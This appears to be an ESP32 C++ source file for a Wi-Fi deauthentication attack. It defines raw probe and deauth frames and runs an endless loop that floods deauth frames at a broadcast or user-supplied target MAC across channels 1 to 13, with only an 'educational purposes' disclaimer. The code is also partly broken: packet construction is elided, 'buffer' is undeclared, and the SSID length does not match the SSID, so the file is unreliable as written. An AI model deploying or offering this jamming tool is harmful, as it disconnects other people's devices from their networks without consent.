/*
   Author: [Eunous]
   Date: [10/27/23]
   Description: This code demonstrates Wi-Fi deauthentication attacks using ESP32.
   The use of this code is for educational and testing purposes only.

   Instructions:
   1. Include the "test.h" header file.
   2. Define probePacket and deauthPacket arrays to specify Wi-Fi probe request and deauthentication frames.
   3. Implement functions to configure Wi-Fi parameters, perform deauthentication attacks, and switch Wi-Fi channels.
   4. Implement a task (spam_task) for continuous deauthentication attacks on specified channels.

   Note: This code is for educational and testing purposes only and should be used responsibly.
*/

#include "deauther.h"

    // Probe Request Frame
const uint8_t probePacket[] = {
    /*  0 - 1  */ 0x40, 0x00,                                       // Type: Probe Request
    /*  2 - 3  */ 0x00, 0x00,                                       // Duration: 0 microseconds
    /*  4 - 9  */ 0xff, 0xff,               0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
    /* 10 - 15 */ 0xAA, 0xAA,               0xAA, 0xAA, 0xAA, 0xAA, // Source: random MAC
    /* 16 - 21 */ 0xff, 0xff,               0xff, 0xff, 0xff, 0xff, // BSS Id: Broadcast
    /* 22 - 23 */ 0x00, 0x00,                                       // Sequence number (will be replaced by the SDK)
    /* 24 - 25 */ 0x00, 0x20,                                       // Tag: Set SSID length, Tag length: 32
    /* 26 - 57 */ 0x20, 0x20,               0x20, 0x20,             // SSID
    0x20,               0x20,               0x20, 0x20,
    0x20,               0x20,               0x20, 0x20,
    0x20,               0x20,               0x20, 0x20,
    0x20,               0x20,               0x20, 0x20,
    0x20,               0x20,               0x20, 0x20,
    0x20,               0x20,               0x20, 0x20,
    0x20,               0x20,               0x20, 0x20,
    /* 58 - 59 */ 0x01, 0x08, // Tag Number: Supported Rates (1), Tag length: 8
    /* 60 */ 0x82,            // 1(B)
    /* 61 */ 0x84,            // 2(B)
    /* 62 */ 0x8b,            // 5.5(B)
    /* 63 */ 0x96,            // 11(B)
    /* 64 */ 0x24,            // 18
    /* 65 */ 0x30,            // 24
    /* 66 */ 0x48,            // 36
    /* 67 */ 0x6c             // 54
};

    // Deauthentication Frame
const uint8_t deauthPacket[] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x3A, 0x01,                         // duration
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
};


esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

esp_err_t Deauther::esp32_deauther_configure_wifi(uint8_t channel) {
    wifi_config_t ap_config;

    // AP Configuration Parameters
    strcpy((char*)ap_config.ap.ssid, "test");
    ap_config.ap.ssid_len = 22;
    strcpy((char*)ap_config.ap.password, "test");
    ap_config.ap.channel = channel;
    ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
    ap_config.ap.ssid_hidden = 0;
    ap_config.ap.max_connection = 4;
    ap_config.ap.beacon_interval = 60000;

    return esp_wifi_set_config(WIFI_IF_AP, &ap_config);
}

esp_err_t Deauther::deauth(const MacAddr ap, const MacAddr station, const MacAddr bssid, uint8_t channel) {
    esp_err_t res = change_channel(channel);
    if (res != ESP_OK) return res;

    // Construct a deauthentication packet
    // ...

    seqnum++;
    res = raw(buffer, sizeof(deauthPacket), 1);
    if (res == ESP_OK) return ESP_OK;
    buffer[0] = 0xa0;
    return raw(buffer, sizeof(deauthPacket), 1);
}

esp_err_t Deauther::change_channel(uint8_t channel) {
    return esp32_deauther_configure_wifi(channel);
}

esp_err_t Deauther::raw(const uint8_t* packet, int32_t len, bool en_sys_seq) {
    return esp_wifi_80211_tx(WIFI_IF_AP, packet, len, en_sys_seq);
}

void Deauther::SpamTask() {
    const MacAddr TARGET = {
      //replace with the mac address of ur target
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
    };
    const MacAddr AP = {
      //replace with your AP's mac address 
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    while (1) {
        // Delay before each round of deauthentication
        delay(2000);
        for (uint8_t ch = 1; ch < 14; ch++) {
            printf("Deauthing channel %d\n", ch);
            esp_err_t res;
            res = deauth(TARGET, AP, AP, ch);
            if (res != ESP_OK) printf("  Error: %s\n", esp_err_to_name(res));
        }
    }
}
